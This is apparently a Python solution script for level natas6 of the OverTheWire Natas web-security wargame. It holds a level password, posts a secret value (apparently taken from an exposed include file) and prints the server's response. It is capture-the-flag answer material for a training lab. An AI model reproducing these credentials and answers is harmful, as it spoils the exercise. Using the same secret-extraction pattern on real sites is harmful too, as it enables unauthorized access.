#!/usr/bin/env python

import requests
import json
NATAS = "natas6"
PASS = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
URL = "http://" + NATAS + ".natas.labs.overthewire.org/"
# headers = { 'referer': 'http://natas5.natas.labs.overthewire.org'}
payload = { 'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': True }
r = requests.post(URL , auth=(NATAS, PASS) , data=payload)
#r = requests.get(URL + "includes/secret.inc" , auth=(NATAS, PASS) )
# from bs4 import BeautifulSoup
# soup = BeautifulSoup(r.text, 'html.parser')

# PRETTY = soup.prettify()
# PRETTY = re.sub(r'[\t\r]', '', PRETTY)
# print(PRETTY)
print(r.text)
print(r.history)
print(r.status_code)
# print(r.text)
# print("Encording: " + r.encoding + "HTTP Code: " + "Headers: " + r.headers)
print(r.headers)

#"FOEIUWGHFEEUHOFUOIU"
